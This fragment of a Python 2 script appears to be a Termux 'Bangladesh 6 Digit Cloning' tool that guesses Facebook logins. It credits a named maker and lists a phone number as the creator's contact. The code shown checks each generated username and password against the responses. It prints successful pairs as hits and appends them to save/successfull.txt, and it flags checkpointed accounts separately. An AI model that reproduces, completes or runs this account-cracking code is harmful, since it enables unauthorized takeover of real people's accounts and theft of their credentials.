...
psb('\x1b[1;92mBangladesh 6 Digit Cloning Start please Wait__This tools maked  by It"s FOYSAL HOSEN ')
...
def menu():
    ...
    print '\033[0;96mCreator : 01793268786'
    print '\033[0;96mpage: Termux-Foysal & Top King Star 07'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[FOYSAL-BD-CP\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92m [FOYSAL-BD-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
